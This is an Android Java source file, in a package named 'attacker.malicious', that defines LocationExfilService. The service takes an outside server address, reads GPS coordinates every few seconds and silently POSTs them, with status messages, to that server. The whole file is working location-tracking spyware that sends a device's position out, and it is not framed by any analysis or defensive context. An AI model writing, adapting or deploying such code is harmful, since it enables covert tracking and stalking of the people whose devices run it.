package attacker.malicious;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.util.HashMap;
import java.util.Map;

public class LocationExfilService extends Service {

    private LocationListener mListener;
    private LocationManager mLocationManager;
    private String server;

    public LocationExfilService() {
        super();
    }

     @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    
    private void log(String msg) {
        HashMap<String, String> data = new HashMap<>();
        data.put("log", msg);
        send(data);
    }

    public void log(String label, String msg) {
        HashMap<String, String> data = new HashMap<>();
        data.put(label, msg);
        send(data);
    }

       @Override
    public void onDestroy() {
        super.onDestroy();
        if(mLocationManager!=null){
            mLocationManager.removeUpdates(mListener);
        }
    }

    @SuppressLint("MissingPermission")
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        log("Location Exfil Service ", "service started");
        server = intent.getExtras().getString("server");

        mListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
     
                log("New coordinates", "\nLatitude: "+location.getLatitude()+"\nLongitude: "+location.getLongitude());

            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {

            }

            @Override
            public void onProviderEnabled(String provider) {

            }

            @Override
            public void onProviderDisabled(String provider) {
                log("Location Exfil Service ", "GPS is off");
            }
        };

        mLocationManager = (LocationManager) getApplicationContext().getSystemService(Context.LOCATION_SERVICE);

        mLocationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,3000,0,mListener);

        return Service.START_NOT_STICKY;
    }

    public void send(final HashMap<String, String> data) {
        final RequestQueue queue = Volley.newRequestQueue(getApplicationContext());

        StringRequest req = new StringRequest(
                Request.Method.POST,
                server,
                new Response.Listener<String>() { @Override public void onResponse(String response) {}},
                new Response.ErrorListener() { @Override public void onErrorResponse(VolleyError err) {} })
        {
            @Override
            protected Map<String, String> getParams() {
                return data;
            }
        };

        queue.add(req);
    }
  

}
